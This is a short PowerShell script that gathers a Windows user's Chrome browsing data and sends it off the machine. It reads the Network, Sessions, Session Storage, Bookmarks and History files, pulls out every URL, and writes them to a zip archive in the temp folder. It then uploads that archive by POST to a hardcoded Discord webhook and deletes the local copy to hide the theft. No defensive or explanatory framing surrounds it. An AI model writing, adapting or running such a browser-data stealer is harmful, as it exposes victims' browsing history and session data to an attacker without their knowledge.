$hookurl = "https://discord.com/api/webhooks/1317577535852380190/Ohvb8N1p1p2_NjBp0uBPyfS69mfDjuexsrTzfwB-UwJmFfrS0kBNDbUEypCTonNKLlj9"

# Define the Regular expression for extracting history and bookmarks
$Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

# Define paths for data storage
$Paths = @{
    'chrome_network'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Network"
    'chrome_sessions'   = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Sessions"
    'chrome_session_storage' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Session Storage"
    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
}

# Define browsers and data
$Browsers = @('chrome')
$DataValues = @('network', 'sessions', 'session_storage', 'bookmarks', 'history')
$outpath = "$env:temp\Chrome.zip"

foreach ($Browser in $Browsers) {
    foreach ($DataValue in $DataValues) {
        $PathKey = "${Browser}_${DataValue}"
        $Path = $Paths[$PathKey]

        $Value = Get-Content -Path $Path | Select-String -AllMatches $Expression | % {($_.Matches).Value} | Sort -Unique

        $Value | ForEach-Object {
            [PSCustomObject]@{
                Browser  = $Browser
                DataType = $DataValue
                Content = $_
            }
        } | Out-File -FilePath $outpath -Append
    }
}

Compress-Archive $outpath -DestinationPath $outpath
Invoke-WebRequest -Uri $hookurl -Method Post -InFile $outpath
rm -Path $outpath -Force
